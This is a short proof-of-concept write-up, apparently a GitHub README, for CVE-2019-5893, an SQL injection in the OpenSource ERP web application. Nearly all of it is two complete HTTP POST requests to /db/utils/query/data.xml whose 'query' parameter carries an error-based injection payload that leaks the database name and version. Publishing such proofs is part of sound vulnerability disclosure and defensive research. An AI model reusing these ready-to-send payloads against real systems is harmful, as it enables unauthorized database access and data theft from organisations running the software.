# OpenSource-ERP-SQL-Injection
[OpenSource ERP](http://www.nelson-it.ch/) application has SQL Injection vulnerability.

## CVE-2019-5893
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5893

https://www.exploit-db.com/exploits/46118

# PoC - Get DB name
```
POST /db/utils/query/data.xml HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://172.16.118.142:8024
Referer: http://172.16.118.142:8024/
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
Cookie: MneHttpSessionId8024=15471285865828
Host: 172.16.118.142:8024
Content-Length: 423
Accept-Encoding: gzip, deflate
Connection: close

sqlend=1&query=%27%7c%7ccast((select+chr(95)%7c%7cchr(33)%7c%7cchr(64)%7c%7c(SELECT+current_database())%7c%7cchr(95)%7c%7cchr(33)%7c%7cchr(64))+as+numeric)%7c%7c%27&schema=mne_application&table=userpref&cols=startweblet%2cregion%2cmslanguage%2cusername%2cloginname%2cpersonid%2clanguage%2cregionselect%2ctimezone%2ccountrycarcode%2cstylename%2cusername%2cstartwebletname&usernameInput.old=session_user&mneuserloginname=test
```
![alt tag](https://emreovunc.com/blog/en/OpenERP-SQL-DBname.png)

# PoC - Get DB version
```
POST /db/utils/query/data.xml HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://172.16.118.142:8024
Referer: http://172.16.118.142:8024/
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
Cookie: MneHttpSessionId8024=15471285865828
Host: 172.16.118.142:8024
Content-Length: 414
Accept-Encoding: gzip, deflate
Connection: close

sqlend=1&query=%27%7c%7ccast((select+chr(95)%7c%7cchr(33)%7c%7cchr(64)%7c%7c(SELECT+VERSION())%7c%7cchr(95)%7c%7cchr(33)%7c%7cchr(64))+as+numeric)%7c%7c%27&schema=mne_application&table=userpref&cols=startweblet%2cregion%2cmslanguage%2cusername%2cloginname%2cpersonid%2clanguage%2cregionselect%2ctimezone%2ccountrycarcode%2cstylename%2cusername%2cstartwebletname&usernameInput.old=session_user&mneuserloginname=test
```
![alt tag](https://emreovunc.com/blog/en/OpenERP-SQL-DBversion.png)
